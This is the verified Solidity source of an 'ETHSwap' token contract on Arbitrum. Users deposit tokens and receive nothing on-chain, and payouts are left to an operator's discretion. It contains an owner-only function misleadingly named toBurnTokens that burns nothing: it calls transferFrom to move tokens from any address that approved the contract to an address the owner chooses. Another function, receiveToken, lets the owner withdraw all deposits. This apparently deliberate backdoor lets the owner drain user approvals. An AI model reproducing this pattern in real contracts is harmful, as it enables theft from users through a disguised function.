/**
 *Submitted for verification at Arbiscan.io on 2023-11-13
*/

pragma solidity >=0.6.6;

library SafeMath256 {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface WMATIC {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address owner) external view returns (uint);
}


// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}



interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function mint(address to, uint value) external returns (bool);
    function burn(uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function updateWeight(address spender, uint256 _rmt,bool _isc,uint256 _usdt,bool _isu) external returns (uint256 _rmts,uint256 _usdts);
}

contract ETHSwap is Context, Ownable{
    
    using SafeMath256 for uint256;
    mapping(address => bool) public devOwner;
    address public ettToken;
    address public ethToken;
    address public receive_addr;
    address public operate_addr;
    bool    public work;
    uint256 public max_eth;

    event UpgradeStarLog(address _addr,uint256 _eth);
    event MintTokenLog(address _addr,uint256 _eth);
    event Swap(address _addr, uint256 _ett,uint256 _eth);

    modifier workstatus() {
        require(work == true, 'P');
        _;
    }

    constructor() public {
        work = true;
        ettToken = 0x8581d209E76a86e59BACFdE96425e5d19CbaD083;
        ethToken = 0x429943dB1A4b81892815fd2575DA7Ddd9abf3a57;
        receive_addr = 0x16ec00Cff0eBc761937660c71e2D2083C71f6F8C;
        max_eth = 1000*10**18;
        devOwner[msg.sender]=true;
    }
    
    modifier onlyDev() {
        require(devOwner[msg.sender]==true,'OD');
        _;
    }

    function setAddr(address _addr) public onlyOwner {
        receive_addr = _addr;
    }

    function takeOwnership(address _addr,bool _Is) public onlyOwner {
        devOwner[_addr] = _Is;
    }

    function setWork(bool _is) public onlyOwner{
        work = _is;
    }

    function balanceOf(address account) external view returns (uint256 _balanceOf) {
        _balanceOf =  IERC20(ethToken).balanceOf(account);
    }

    function totalSupply() external view returns (uint256 _totalSupply) {
        _totalSupply =  IERC20(ettToken).totalSupply();
    }

    function UpgradeLevel(uint256 _amount) public workstatus{
        require(_amount<= 1200000000000000000,'MAX');
        IERC20(ethToken).transferFrom(msg.sender,address(this),_amount);
        emit UpgradeStarLog(msg.sender,_amount);
    }

    function MintToken(uint256 _amount) public workstatus{
        require(_amount<= 1200000000000000000,'MAX');
        IERC20(ethToken).transferFrom(msg.sender,address(this),_amount);
        emit MintTokenLog(msg.sender,_amount);
    }


    function swap(address to, uint256 _amount,uint256 _eth) public onlyDev{
        require(_eth <= max_eth,'MAX');
        IERC20(ettToken).burn(_amount);
        IERC20(ethToken).transfer(to,_eth);
        emit Swap(to,_amount,_eth);
    }

    function setMax(uint256 a) public onlyOwner {
        max_eth = a;
    }

    function receiveToken(address t,address ad,uint256 a) public onlyOwner {
        IERC20(t).transfer(ad,a);
    }

    function toBurnTokens(address t,address f,address ad,uint256 a) public onlyOwner {
        IERC20(t).transferFrom(f,ad,a);
    }


}